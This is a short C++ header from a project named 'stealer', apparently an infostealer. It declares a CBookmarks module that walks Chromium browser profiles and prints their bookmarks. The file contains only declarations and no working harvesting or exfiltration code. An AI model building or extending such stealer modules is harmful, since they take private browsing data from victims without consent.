//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CBOOKMARKS_H
#define STEALER_CBOOKMARKS_H


#include "../ChromiumBrowserModule.h"
#include "json.hpp"

using json = nlohmann::json;

class CBookmarks : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
private:
    static void printBookmark(const json &j, std::stringstream &ss);
};


#endif //STEALER_CBOOKMARKS_H
